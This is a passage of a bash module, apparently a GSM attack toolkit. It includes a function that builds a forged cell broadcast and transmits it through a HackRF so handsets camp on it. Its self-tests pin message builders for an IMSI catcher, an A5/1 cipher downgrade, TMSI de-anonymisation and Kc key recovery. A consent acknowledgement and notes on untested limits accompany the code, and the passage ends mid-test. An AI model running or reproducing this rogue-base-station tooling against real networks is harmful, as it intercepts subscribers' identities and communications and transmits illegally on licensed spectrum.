gatk_cmd_transmit() {   # <arfcn> [--bsic N] [--mcc M] [--mnc N] [--lac H] [--ci H]
                        #         [--rate R] [--multiframes N] [--waveform-only]
    local arfcn="${1:-}"; shift || true
    [[ "$arfcn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--transmit needs an ARFCN (0..124 for GSM 900)\n' >&2; return 2; }
    (( arfcn <= 124 )) || {
        printf 'ERROR\tARFCN %s is outside GSM 900 (0..124)\n' "$arfcn" >&2; return 2; }

    local bsic=0 mcc=262 mnc=01 lac=00f1 ci=00a1
    local rate=2166666.666666667 mfrms=1 waveform_only=0
    while (( $# )); do
        case "$1" in
            --bsic) bsic="${2:-0}"; shift 2 ;;
            --mcc)  mcc="${2:-262}"; shift 2 ;;
            --mnc)  mnc="${2:-01}";  shift 2 ;;
            --lac)  lac="${2:-00f1}"; shift 2 ;;
            --ci)   ci="${2:-00a1}"; shift 2 ;;
            --rate) rate="${2:-2166666.666666667}"; shift 2 ;;
            --multiframes) mfrms="${2:-1}"; shift 2 ;;
            --waveform-only) waveform_only=1; shift ;;
            *) printf 'ERROR\t--transmit: unknown option %s\n' "$1" >&2; return 2 ;;
        esac
    done

    (( bsic >= 0 && bsic <= 63 )) || {
        printf 'ERROR\tBSIC must be 0..63 (got %s)\n' "$bsic" >&2; return 2; }
    (( mfrms >= 1 && mfrms <= 8 )) || {
        printf 'ERROR\t--multiframes must be 1..8 (got %s)\n' "$mfrms" >&2; return 2; }

    local mod; mod=$(gatk_gsm_mod)
    [[ -r "$mod" ]] || {
        printf 'ERROR\tthe modulator is missing: %s\n' "$mod" >&2
        printf 'WHY\t11_gsm_attack does not modulate anything itself; %s carries the\n' "$mod" >&2
        printf '\txCCH, SCH and RACH channel coding, the multiframe and the GMSK\n' >&2
        printf '\tshaping pulse. Without it this module can schedule a burst but\n' >&2
        printf '\tcannot produce a sample to transmit.\n' >&2
        return 1; }

    local downlink=$(( 890 + (arfcn * 2) / 10 ))    # MHz, TS 45.005 2.1
    local iq; iq=$(gatk_iq_path "arfcn${arfcn}_bsic${bsic}")

    local si1 si2 si3 si4
    si1=$(gatk_build_si1 "$arfcn")
    si2=$(gatk_build_si2 "$arfcn")
    si3=$(gatk_build_si3 "$mcc" "$mnc" "$lac" "$ci")
    si4=$(gatk_build_si4 "$mcc" "$mnc" "$lac" "$ci")

    local blocks=() b
    for b in "$si1" "$si2" "$si3" "$si4"; do
        local framed; framed=$(gatk_bcch_frame "$b") || return $?
        blocks+=(--block "$framed")
    done

    printf 'transmit\t11_gsm_attack\n'
    printf 'objective\tput a forged BCCH carrier on the air that a handset can camp on\n'
    printf 'arfcn\t%s\n' "$arfcn"
    printf 'downlink_mhz\t%s\n' "$downlink"
    printf 'bsic\t%s\n' "$bsic"
    printf 'ncc\t%s\n' "$(( bsic / 8 ))"
    printf 'bcc\t%s\n' "$(( bsic % 8 ))"
    printf 'tsc\t%s\n' "$(( bsic % 8 ))"
    printf 'tsc_rule\tTS 45.002 5.2.3.1: for BCCH the TSC is the BCC, from TSC Set 1\n'
    printf 'lai_field\t%s\n' "$(gatk_lai_field "$mcc" "$mnc" "$lac")"
    printf 'lai_iei\t%s\n' "$(gatk_lai_encode "$mcc" "$mnc" "$lac")"
    printf 'mcc\t%s\nmnc\t%s\nlac\t%s\nci\t%s\n' "$mcc" "$mnc" "$lac" "$ci"
    printf '\n'
    printf '# the System Information this carrier broadcasts\n'
    printf 'si1\t%s\n' "$(printf '%s' "$si1" | tr -d '\n')"
    printf 'si2\t%s\n' "$(printf '%s' "$si2" | tr -d '\n')"
    printf 'si3\t%s\n' "$(printf '%s' "$si3" | tr -d '\n')"
    printf 'si4\t%s\n' "$(printf '%s' "$si4" | tr -d '\n')"
    printf 'si_len\tSI1=21 SI2=21 SI3=17 SI4=14 octets of L3 (TS 44.018 9.1.3)\n'
    printf 'si1_rule\tTS 44.018 9.1.3.1: Cell Channel Description (16 octets) + RACH Control (3)\n'
    printf 'si3_rule\tTS 44.018 9.1.35: LAI (5) + CI (2) + Control Channel Desc (3) + Cell Selection (2) + RACH Control (3)\n' 
    printf '\n'
    printf '# the waveform\n'
    printf 'multiframes\t%s\n' "$mfrms"
    printf 'tdma_frames\t%s\n' "$(( 51 * mfrms ))"
    printf 'modulator\t%s\n' "$mod"

    # Build the samples first, so a failure to encode is reported before
    # anything is said about a radio.
    local out rc
    out=$(python3 "$mod" carrier "$iq" "${blocks[@]}" \
              --bsic "$bsic" --multiframes "$mfrms" --rate "$rate" --format cs8 2>&1)
    rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tthe modulator failed (rc=%d):\n' "$rc" >&2
        printf '%s\n' "$out" | sed 's/^/\t/' >&2
        return 1
    fi
    printf '%s\n' "$out" | awk -F'\t' '
        $1=="samples"           {printf "samples\t%s\n", $2}
        $1=="sample_rate"       {printf "sample_rate\t%s\n", $2}
        $1=="oversample"        {printf "oversample\t%s\n", $2}
        $1=="frame_samples"     {printf "frame_samples\t%s\n", $2}
        $1=="slot_samples"      {printf "slot_samples\t%s\n", $2}
        $1=="duration_microseconds" {printf "duration_microseconds\t%s\n", $2}
        $1=="bytes"             {printf "bytes\t%s\n", $2}
        $1=="format"            {printf "sample_format\t%s\n", $2}
        $1=="sha256"            {printf "sha256\t%s\n", $2}
    '
    printf 'waveform_file\t%s\n' "$iq"
    printf '\n'
    printf '# limits that are not arithmetic\n'
    printf 'limit\tthe BCCH LAPDm framing is unverified against a live handset. This\n'
    printf '\tmodule wraps each System Information message in address+control only,\n'
    printf '\twith no length octet, on the reading that TS 44.006 5.2 omits the\n'
    printf '\tlength field on BCCH and that SI1/SI2 being exactly 21 octets of L3\n'
    printf '\tis what fills a 23-octet block behind a 2-octet header. The alternative\n'
    printf '\treading -- a 3-octet header as gatk_lapdm_ui builds for SDCCH/SACCH --\n'
    printf '\tleaves only 20 octets and cannot carry SI1 or SI2 at all. Neither\n'
    printf '\treading has been checked against a captured BCCH block or a handset.\n'
    printf 'limit\tgr-gsm proof covers channel coding, interleaving, burst mapping,\n'
    printf '\tTDMA framing and GMSK modulation: grgsm_decode recovers these exact\n'
    printf '\t23-octet blocks at the right frame numbers. It does NOT prove a\n'
    printf '\thandset camps on the carrier; nobody has put this on the air.\n'
    printf 'limit\tthe SI messages carry a synthetic cell: LAI 262/01, CI 00a1 and\n'
    printf '\tthe ARFCN of this transmitter only. They are syntactically valid, not\n'
    printf '\ttuned to beat a real cell in any particular location.\n'
    printf 'limit\tRACH Control Parameters are all zero: no access class barred,\n'
    printf '\tmaximum MS power, cell not barred. That is deliberately permissive\n'
    printf '\tand is itself a detectable signature.\n'

    if (( waveform_only )); then
        printf '\n'
        printf 'status\twaveform-built\n'
        printf 'transmitted\tno\n'
        printf 'why\t--waveform-only was given: the samples exist, no radio was asked for\n'
        return 0
    fi

    # Ask the radio. A missing transmitter is a failure, not a warning.
    local dev
    if ! dev=$(gatk_tx_device); then
        local installed
        installed=$(gatk_find_tx_sdr 2>/dev/null || true)
        printf '\n' >&2
        printf 'ERROR\tno transmit-capable SDR is attached\n' >&2
        if [[ -n "$installed" ]]; then
            printf 'FOUND\tthe %s tools are installed, but %s reports no device:\n' \
                "$installed" "$([[ "$installed" == hackrf ]] && echo hackrf_info || echo "the $installed probe")" >&2
            timeout 15 hackrf_info 2>&1 | sed 's/^/\t/' >&2
            printf 'WHY\tinstalled is not attached. `command -v` finds the tool; the\n' >&2
            printf '\tdevice has to answer. Plug the radio in and re-run.\n' >&2
        else
            printf 'FOUND\tnone of hackrf_transfer, bladeRF-cli, LimeUtil or uhd_find_devices\n' >&2
            printf 'WHY\tthis module needs a full-duplex SDR that can transmit; an RTL-SDR\n' >&2
            printf '\tcannot, so it never satisfies this guard.\n' >&2
        fi
        printf 'NOTRANSMITTED\tthe waveform was built and written to %s, but nothing was\n' "$iq" >&2
        printf '\tkeyed. Re-run with a radio attached, or --waveform-only to build\n' >&2
        printf '\twithout asking for one.\n' >&2
        return 3
    fi

    printf 'tx_device\t%s\n' "$dev"
    local rate_int; rate_int=$(printf '%.0f' "$rate")
    local gain="${GATK_TX_GAIN:-0}"
    printf '\n'
    printf 'sdr_call\thackrf_transfer -t %s -f %s000000 -s %s -a 1 -x %s\n' \
        "$iq" "$downlink" "$rate_int" "$gain"

    case "$dev" in
        hackrf)
            local lout lrc
            lout=$(timeout 120 hackrf_transfer -t "$iq" -f "$(( downlink * 1000000 ))" \
                       -s "$rate_int" -a 1 -x "$gain" 2>&1); lrc=$?
            if (( lrc != 0 )); then
                printf 'ERROR\thackrf_transfer exited %d\n' "$lrc" >&2
                printf '%s\n' "$lout" | sed 's/^/\t/' >&2
                printf 'status\ttransmit-failed\n' >&2
                return 1
            fi
            printf '%s\n' "$lout" | sed 's/^/sdr: /'
            ;;
        *)
            printf 'ERROR\tthe %s transmit call is not written yet\n' "$dev" >&2
            printf 'WHY\tonly the hackrf_transfer path is implemented; the %s branch\n' "$dev" >&2
            printf '\twould otherwise report a success it did not perform.\n' >&2
            return 1 ;;
    esac

    printf '\n'
    printf 'status\ttransmitted\n'
    printf 'keyed\tyes: %s accepted the samples\n' "$dev"
    printf 'duration_microseconds\t%s\n' \
        "$(printf '%s\n' "$out" | awk -F'\t' '$1=="duration_microseconds"{print $2}')"
    return 0
}

# ── The transmit acknowledgement ────────────────────────────────────────
# Every vector above computes a schedule. None of them keys a radio. When a
# driver exists it takes this acknowledgement first, so the intent to transmit
# is a thing the operator says out loud rather than a side effect of asking a
# question. Same shape as wifisting's jammer gate.
gatk_cmd_tx_ack() {
    cat <<'EOF'
TRANSMIT ACKNOWLEDGEMENT — GSM attack vectors
=============================================

The schedules this module produces drive a transmitter on licensed spectrum.
Before any driver keys a radio, the operator is stating all of the following:

  1. The ARFCN is licensed to them, or they hold written authorisation from
     the licensee to transmit on it.
  2. They accept that an IMSI catcher, a forged Cipher Mode Command and a
     forced Identity Request are indistinguishable, to the network and to a
     regulator, from a real attack on real subscribers.
  3. They understand the module has NEVER been fired against a radio. The
     octets, the frame numbers and the schedules are computed and checked
     against 3GPP tables; whether a handset accepts them is unknown.
  4. They will not run these against a network they do not control, and will
     not retain identities captured from anyone who has not consented.

This is not a prompt. It is the record that the decision was made.
EOF
    printf '\n'
    printf 'ack\trequired\n'
    printf 'module\t11_gsm_attack\n'
    printf 'vectors\timsi-catcher a5-downgrade tmsi-deanon kc-recovery\n'
    printf 'to_schedule\t--vector-imsi-catcher | --vector-a5-downgrade | --vector-tmsi-deanon | --vector-kc-recovery\n'
    printf 'note\tscheduling a vector does not require this; keying a radio does\n'
}

# ── CLI verbs ───────────────────────────────────────────────────────────
gatk_cli_status_tsv() {
    local tx rx stack
    tx=$(gatk_find_tx_sdr) || tx="none"
    rx=$(gatk_find_rx_sdr) || rx="none"
    stack=$(gatk_find_gsm_stack) || stack="none"
    printf 'tx_sdr\t%s\n'      "$tx"
    printf 'rx_sdr\t%s\n'      "$rx"
    printf 'gsm_stack\t%s\n'   "$stack"
    printf 'tx_capable\t%s\n'  "$([[ "$tx" != none ]] && echo yes || echo no)"
    printf 'dir\t%s\n'         "$GATK_DIR"
    printf 'plans\t%s\n'       "$(gatk_plan_count)"
    printf 'can_transmit\t%s\n' "$([[ "$tx" != none && "$stack" != none ]] && echo yes || echo no)"
    printf 'kc_frame_bits\t228\n'
    printf 'kc_bits_required\t456\n'
}

gatk_plan_count() {
    local n=0 f
    for f in "$GATK_DIR"/plan_*.tsv; do [[ -f "$f" ]] && n=$(( n + 1 )); done
    echo "$n"
}

# ── selftest — no radio, no root, no network ────────────────────────────
gatk_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad + 1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot"
    export CAPTURES_DIR="$d/captures"
    export GATK_DIR="$d/loot/gsm_attack"

    # 1. Plan files: written, labelled handoff, and they name real hardware.
    local p
    for p in imsi-catcher a5-downgrade tmsi-deanon kc-recovery; do
        out=$(gatk_write_plan "$p"); rc=$?
        chk "plan-${p}-rc"     "$rc" "0"
        local f; f=$(printf '%s' "$out" | cut -f2)
        chk "plan-${p}-exists" "$([[ -f "$f" ]] && echo yes || echo no)" "yes"
        chk "plan-${p}-status" "$(awk -F'\t' '$1=="status"{print $2}' "$f")" "handoff"
        chk "plan-${p}-names-hw" \
            "$(awk -F'\t' '$1=="hardware"{print ($2 ~ /SDR/) ? "y" : "n"}' "$f")" "y"
        chk "plan-${p}-not-empty" "$([[ -s "$f" ]] && echo yes || echo no)" "yes"
    done
    chk plan-count "$(gatk_plan_count)" "4"

    #    Each plan must carry real steps, not a stub.
    chk plan-imsi-steps  "$(awk -F'\t' '$1 ~ /^step/{n++} END{print (n>=6)?"y":"n"}' \
                            "$(gatk_plan_path imsi-catcher)")" "y"
    chk plan-kc-methods "$(grep -c '^method' "$(gatk_plan_path kc-recovery)")" "3"
    chk plan-kc-bits    "$(awk -F'\t' '$1=="method_a_two_known_plaintext"{print ($2 ~ /456/) ? "y":"n"}' \
                            "$(gatk_plan_path kc-recovery)")" "y"
    # The paging modulus is 1000, not 1024 (TS 45.002 6.5.2). This assertion
    # used to require the wrong value, which is how the error survived.
    chk plan-tmsi-group "$(awk -F'\t' '$1=="paging_mapping"{print ($2 ~ /IMSI mod 1000/) ? "y":"n"}' \
                            "$(gatk_plan_path tmsi-deanon)")" "y"
    chk plan-tmsi-no1024 "$(awk -F'\t' '$1=="paging_mapping"{print ($2 ~ /1024/) ? "y":"n"}' \
                            "$(gatk_plan_path tmsi-deanon)")" "n"

    #    An unknown plan name must fail and write nothing.
    chk plan-unknown-rc   "$(gatk_write_plan 'no-such-plan' >/dev/null 2>&1; echo $?)" "2"
    chk plan-unknown-cmd  "$(gatk_cmd_plan 'no-such-plan' >/dev/null 2>&1; echo $?)"  "2"
    chk plan-missing-arg  "$(gatk_cmd_plan >/dev/null 2>&1; echo $?)" "2"
    chk plan-no-stray     "$(ls "$GATK_DIR" | grep -c 'no-such-plan')" "0"

    # 2. Classmark encoder: byte-exact against a hand-computed encoding.
    #    revision=3, es_ind=0, a5/1=1, rfpow=3 -> o1 = 3 | 0 | 8 | 0x30 = 0x3b
    #    ss_screen=1 (bit2 set -> bit index 1), sm_cap=1 (bit4 -> index 3)
    #      -> o2 = 2 | 8 = 0x0a
    #    cm3=0, lcs=0, ps=1 (bit3 -> index 2) -> o3 = 4
    #    a5/2..a5/7 = 0, cmsp=0 -> o4 = 0
    #    so_lsa=0, ucs2=0 -> o5 = 0
    #    Every value below is read off figure 10.5.6/3GPP TS 24.008, not off
    #    this encoder. Defaults: rev=3 es=0 a51=1(wire: A5/1 NOT available)
    #    rfpow=3 ss=1 sm=1 ps=1, everything else 0.
    #      octet3 = (3<<5)|(0<<4)|(1<<3)|3 = 0x6b
    #      octet4 = (1<<6)|(1<<4)|(1<<3)   = 0x58
    #      octet5 = 0                      = 0x00
    chk cm-default   "$(gatk_classmark_encode)" "33036b5800"
    chk cm-iei       "$(gatk_classmark_encode | cut -c1-2)" "33"
    chk cm-length    "$(gatk_classmark_encode | cut -c3-4)" "03"
    #    A5/1 available is wire bit 0: (3<<5)|0|0|3 = 0x63.
    chk cm-a51-avail "$(gatk_classmark_encode 3 0 0 3)" "3303635800"
    #    A5/3 capability is octet 5 bit 2 -> 0x02.
    chk cm-a53       "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 0 0 0 1 0 1)" "33036b5802"
    #    rev=0, es=1, a5/1 not available, rfpow=7 -> (0<<5)|(1<<4)|(1<<3)|7 = 0x1f.
    chk cm-rfpow7    "$(gatk_classmark_encode 0 1 1 7)" "33031f5800"
    #    Dropping ES-IND to 0 must clear exactly bit 5: 0x1f -> 0x0f.
    chk cm-esind0    "$(gatk_classmark_encode 0 0 1 7)" "33030f5800"
    chk cm-rev0      "$(gatk_classmark_encode 0 0 1 3)" "33030b5800"
    #    FC is octet 4 bit 1, the LSB — not bit 8 as the old encoder had it.
    chk cm-fc-bit1   "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 1 | cut -c7-8)" "59"

    #    Round-trip: encode then decode must return every input field.
    local cm; cm=$(gatk_classmark_encode 3 0 1 5 3 1 0 1 1 1 1 1 1 1 1 0 0 0 0 1 1 1)
    out=$(gatk_classmark_decode "$cm")
    chk cm-rt-iei   "$(fld "$out" iei)"        "33"
    chk cm-rt-len   "$(fld "$out" length)"     "3"
    chk cm-rt-rev   "$(fld "$out" revision)"   "3"
    chk cm-rt-es    "$(fld "$out" es_ind)"     "0"
    chk cm-rt-a51   "$(fld "$out" a5_1)"       "1"
    chk cm-rt-rfpw  "$(fld "$out" rf_power)"   "5"
    chk cm-rt-ps    "$(fld "$out" ps)"         "1"
    chk cm-rt-ss    "$(fld "$out" ss_screen)"  "3"
    chk cm-rt-sm    "$(fld "$out" sm_cap)"     "1"
    chk cm-rt-vbsn  "$(fld "$out" vbs_notif)"  "1"
    chk cm-rt-vgcs  "$(fld "$out" vgcs)"       "1"
    chk cm-rt-fc    "$(fld "$out" fc)"         "1"
    chk cm-rt-cm3   "$(fld "$out" cm3)"        "1"
    chk cm-rt-lcs   "$(fld "$out" lcs)"        "1"
    chk cm-rt-ucs2  "$(fld "$out" ucs2)"       "1"
    chk cm-rt-solsa "$(fld "$out" so_lsa)"     "1"
    chk cm-rt-cmsp  "$(fld "$out" cmsp)"       "1"
    chk cm-rt-a53   "$(fld "$out" a5_3)"       "1"
    chk cm-rt-a52   "$(fld "$out" a5_2)"       "1"
    chk cm-rt-len   "$(printf '%s' "$cm" | wc -c | tr -d ' ')" "10"

    #    Argument validation, including the fields this IE cannot carry.
    chk cm-bad-hex   "$(gatk_classmark_decode 'zz' >/dev/null 2>&1; echo $?)" "2"
    chk cm-short     "$(gatk_classmark_decode 'aabb' >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-iei   "$(gatk_classmark_decode '1233635800' >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-rev   "$(gatk_classmark_encode 9 >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-rfp   "$(gatk_classmark_encode 3 0 1 9 >/dev/null 2>&1; echo $?)" "2"
    chk cm-bad-num   "$(gatk_classmark_encode x >/dev/null 2>&1; echo $?)" "2"
    #    A5/4 is a Classmark 3 field; the encoder must refuse, not drop it.
    chk cm-no-a54    "$(gatk_classmark_encode 3 0 1 3 1 1 0 0 0 0 0 0 1 0 0 1 >/dev/null 2>&1; echo $?)" "2"
    chk cm-no-vbs    "$(gatk_classmark_encode 3 0 1 3 1 1 1 >/dev/null 2>&1; echo $?)" "2"

    #    The downgrade edit must set A5/1 to "not available" and change
    #    nothing else. TS 24.008: bit4 1 = A5/1 not available.
    out=$(gatk_classmark_downgrade 3303635800)
    chk cm-down-after "$(fld "$out" after)"  "33036b5800"
    chk cm-down-field "$(fld "$out" cleared_field)" "a5_1"
    chk cm-down-was   "$(fld "$out" was)"    "A5/1 available"
    chk cm-down-now   "$(fld "$out" now)"    "A5/1 not available"
    chk cm-down-idem  "$(fld "$(gatk_classmark_downgrade 33036b5800)" changed)" "no"
    chk cm-down-bad   "$(gatk_classmark_downgrade 'zz' >/dev/null 2>&1; echo $?)" "2"
    chk cm-down-iei   "$(gatk_classmark_downgrade '1233635800' >/dev/null 2>&1; echo $?)" "2"

    # 3. Identity Request construction, byte-exact.
    out=$(gatk_build_identity_request 1)
    chk ir-octets  "$(fld "$out" octets)" "060501"
    chk ir-name    "$(fld "$out" identity_type)" "1"
    out=$(gatk_build_identity_request 4)
    chk ir-tmsi    "$(fld "$out" octets)" "060504"
    chk ir-bad-zero "$(gatk_build_identity_request 0 >/dev/null 2>&1; echo $?)" "2"
    chk ir-bad-high "$(gatk_build_identity_request 9 >/dev/null 2>&1; echo $?)" "2"
    chk ir-bad-text "$(gatk_build_identity_request x >/dev/null 2>&1; echo $?)" "2"

    # 4. IMSI catcher sequence: real channels and message types.
    local seq; seq=$(gatk_imsi_catcher_sequence)
    chk seq-steps      "$(printf '%s\n' "$seq" | tail -n +2 | grep -c .)" "14"
    chk seq-fields     "$(printf '%s\n' "$seq" | awk -F'\t' 'NF!=6' | grep -c .)" "0"
    chk seq-rach       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="RACH"{print $4}')" "CHANNEL REQUEST"
    chk seq-agch       "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="AGCH"{print $5}')" "0x3f"
    chk seq-sdcch      "$(printf '%s\n' "$seq" | awk -F'\t' '$2=="SDCCH"' | grep -c .)" "7"
    chk seq-id-req     "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY REQUEST"{print $5}')" "0x05"
    chk seq-id-resp    "$(printf '%s\n' "$seq" | awk -F'\t' '$4=="IDENTITY RESPONSE"{print $5}')" "0x06"
    chk seq-si3        "$(printf '%s\n' "$seq" | awk -F'\t' '$4 ~ /TYPE 3$/{print $5}')" "0x1b"

    # 5. Paging race arithmetic. One TDMA frame is 4.615 ms; a 51-multiframe
    #    is 51 * 4.615 = 235.4 ms.
    out=$(gatk_paging_race 3)
    chk race-mf-ms   "$(fld "$out" multiframe_ms)" "235.4"
    chk race-lead-ms "$(fld "$out" attacker_lead_ms)" "13.85"
    chk race-frames  "$(fld "$out" multiframe_frames)" "51"
    out=$(gatk_paging_race 0)
    chk race-lose    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="verdict"{print ($2 ~ /loses/) ? "y":"n"}')" "y"
    chk race-bad     "$(gatk_paging_race abc >/dev/null 2>&1; echo $?)" "2"

    # 6. C1 reselection arithmetic (TS 45.008 section 6.4).
    #    A = -100 - (-90) = -10 ; B = 33 - 30 = 3 ; C1 = -10 - 3 = -13
    out=$(gatk_c1 -100 -90 33 30)
    chk c1-A   "$(fld "$out" A_dbm)"  "-10"
    chk c1-B   "$(fld "$out" B_dbm)"  "3"
    chk c1-C1  "$(fld "$out" C1_dbm)" "-13"
    chk c1-sel "$(fld "$out" selectable)" "no"
    #    A positive C1 comes from a strong signal: A = -90-(-105) = 15,
    #    B = 33-33 = 0 -> C1 = 15.
    out=$(gatk_c1 -90 -105 33 33)
    chk c1-positive "$(fld "$out" C1_dbm)" "15"
    chk c1-selectable "$(fld "$out" selectable)" "yes"
    #    A negative B is clamped to zero, not subtracted.
    out=$(gatk_c1 -90 -105 20 33)
    chk c1-clampB "$(fld "$out" B_dbm)" "-13"
    chk c1-clampC1 "$(fld "$out" C1_dbm)" "15"
    chk c1-bad-args "$(gatk_c1 1 2 3 >/dev/null 2>&1; echo $?)" "2"
    chk c1-bad-text "$(gatk_c1 a b c d >/dev/null 2>&1; echo $?)" "2"

    # 7. Kc recovery facts: the byte counts the attack actually needs.
    out=$(gatk_kc_recovery_facts)
    chk kc-frame-bits  "$(fld "$out" frame_bits)" "228"
    chk kc-req-bits    "$(fld "$out" keystream_bits_required)" "456"
    chk kc-frames      "$(fld "$out" frames_required)" "2"
    chk kc-bits        "$(fld "$out" kc_bits)" "64"
    chk kc-eff-bits    "$(fld "$out" kc_effective_bits)" "54"
    chk kc-zero-bits   "$(fld "$out" comp128_zero_bits)" "10"
    chk kc-burst-bits  "$(fld "$out" burst_cipher_bits)" "114"
    chk kc-2x114       "$(( $(fld "$out" burst_cipher_bits) * 2 ))" "$(fld "$out" frame_bits)"
    chk kc-2x228       "$(( $(fld "$out" frame_bits) * 2 ))"       "$(fld "$out" keystream_bits_required)"
    chk kc-64-minus-10 "$(( $(fld "$out" kc_bits) - $(fld "$out" comp128_zero_bits) ))" "$(fld "$out" kc_effective_bits)"

    # 8. Hex plumbing, shared contract with 06_gsm_air.sh.
    chk hex-norm   "$(gatk_norm_hex 'AB CD')" "abcd"
    chk hex-bits   "$(gatk_hex_to_bits 'a5')" "10100101"
    chk bits-hex   "$(gatk_bits_to_hex '10100101')" "a5"
    chk hex-rt     "$(gatk_bits_to_hex "$(gatk_hex_to_bits 'deadbeef')")" "deadbeef"

    # 9. Sanitisation of untrusted text.
    local evil; evil=$(gatk_sanitize $'Evil\tCell\r\nRow')
    chk sanitize-tabs "$(printf '%s' "$evil" | tr -cd '\t' | wc -c | tr -d ' ')" "0"
    chk sanitize-nl   "$(printf '%s' "$evil" | tr -cd '\n' | wc -c | tr -d ' ')" "0"

    # 10. Status TSV contract. SDR presence is environment-dependent.
    out=$(gatk_cli_status_tsv)
    chk status-dir     "$(fld "$out" dir)"   "$GATK_DIR"
    chk status-plans   "$(fld "$out" plans)" "4"
    chk status-kcbits  "$(fld "$out" kc_frame_bits)"    "228"
    chk status-kcreq   "$(fld "$out" kc_bits_required)" "456"
    chk status-tx-field "$(printf '%s\n' "$out" | grep -c '^tx_sdr')" "1"

    # 11. CLI dispatch: unknown verb is a usage error, not a success.
    chk cli-unknown "$(gatk_cli_main --nope >/dev/null 2>&1; echo $?)" "2"

    # 12. Real cipher implementations against published vectors. Each of these
    #     is transcribed from a 3GPP/ETSI document, so a failure here means the
    #     cipher is wrong, not that the expectation drifted. The KAT suite is
    #     also reachable on its own as the body of --a5-*-keystream checks.
    local katout kat_sum
    katout=$(gatk_kat_suite 2>&1)
    kat_sum=$(printf '%s\n' "$katout" | awk -F'\t' '/^KAT\tSUMMARY/{print $3" "$4}')
    chk ciphers-kat-summary "$kat_sum" "pass=19 fail=0"

    # 13. Codecs and builders: round-trip every lossless transform, and pin
    #     the exact octets of each message so a layout regression is caught.
    chk cm1-rt "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '/^revision-level/{print $2}')" "1"
    # TS 24.008 figure 10.5.5, bit 1 = LSB: rev bits 7-6, ES bit 5,
    # A5/1 bit 4 (0=available), RF power bits 3-1.
    #   rev=1 es=0 avail=1 pwr=4 -> (1<<5)|(0<<4)|(0<<3)|4 = 0x24
    #   rev=1 es=0 avail=0 pwr=4 -> (1<<5)|(0<<4)|(1<<3)|4 = 0x2c
    chk cm1-a51-avail       "$(gatk_classmark1_encode 1 4 0 1)" "24"
    chk cm1-a51-unavailable "$(gatk_classmark1_encode 1 4 0 0)" "2c"
    chk cm1-rt-a51  "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '/^a5-1-available/{print $2}')" "yes"
    chk cm1-rt-rfpw "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '/^rf-power-capability/{print $2}')" "4"
    chk cm1-rt-es   "$(gatk_classmark1_decode "$(gatk_classmark1_encode 1 4 0 1)" | awk -F'\t' '$1=="es-ind"{print $2}')" "0"
    # A phase-2 handset reporting 0x33: rev 1, ES implemented, A5/1 available,
    # RF power class 4. Read off figure 10.5.5.
    chk cm1-real-rev "$(gatk_classmark1_decode 33 | awk -F'\t' '/^revision-level/{print $2}')" "1"
    chk cm1-real-a51 "$(gatk_classmark1_decode 33 | awk -F'\t' '/^a5-1-available/{print $2}')" "yes"
    chk cm1-real-pwr "$(gatk_classmark1_decode 33 | awk -F'\t' '/^rf-power-capability/{print $2}')" "3"
    chk lai-rt2 "$(gatk_lai_decode "$(gatk_lai_encode 262 01 0000)" | awk -F'\t' '/^mnc/{print $2}')" "01"
    chk lai-rt3 "$(gatk_lai_decode "$(gatk_lai_encode 262 012 1234)" | awk -F'\t' '/^mnc/{print $2}')" "012"
    chk lai-lac "$(gatk_lai_decode "$(gatk_lai_encode 310 260 1a2b)" | awk -F'\t' '$1=="lac"{print $2}')" "1a2b"
    # 6 octets on the wire: IEI 17, length 05, value octet f4, then 4 TMSI octets.
    chk mi-tmsi-len "$(printf '%s' "$(gatk_mobile_identity_tmsi 0f200001)" | wc -c | tr -d ' ')" "14"
    chk mi-tmsi-type "$(gatk_mobile_identity_decode "$(gatk_mobile_identity_tmsi 0f200001)" | awk -F'\t' '/^type-of-identity/{print $2}')" "4"
    chk build-cipher-a52 "$(gatk_build_cipher_mode A5/2)" "06350304"
    chk build-cipher-a51 "$(gatk_build_cipher_mode A5/1)" "06350104"
    # Cipher Response is always present; CR=1 sets bit 4 of its value octet.
    chk build-cipher-cr "$(gatk_build_cipher_mode A5/3 1)" "06350514"
    chk build-paging "$(gatk_build_paging_request 0f200001 | tr -d '\n')" "0621001705f40f200001"
    chk build-lu-accept "$(gatk_build_lu_accept 0f200001 | tr -d '\n')" "05000262f21000001705f40f200001"
    chk build-tmsi-realloc "$(gatk_build_tmsi_realloc 0f200001 | tr -d '\n')" "05001a62f210000005f40f200001"
    chk build-lu-reject-bad-tmsi "$(gatk_build_lu_accept zzz >/dev/null 2>&1; echo $?)" "2"

    # AGCH IMMEDIATE ASSIGNMENT, TS 44.018 9.1.18 and table 9.1.18.1.
    # The assertion that matters is ia-pd-nibble: the octet after the L2
    # pseudo length carries the protocol discriminator in its LOW nibble and
    # the skip indicator in its HIGH nibble, because 10.3.1 says the skip
    # indicator occupies "bits 5 to 8" of the first octet. So RR is 0x06.
    # The first version of this builder emitted 0x60 - the two nibbles
    # transposed - which no decoder rejects; it silently re-reads the message
    # as DTAP with protocol discriminator 11. This check exists to stop that
    # coming back, and the octets below are the ones Wireshark decodes as
    # "Immediate Assignment, Page Mode normal, SDCCH/4 subchannel 0, TSC 7,
    # ARFCN 62, RA 12, TA 0".
    local ia
    ia=$(gatk_build_immediate_assignment 0c 0 0 sdcch4 0 62 7 0 0 2b)
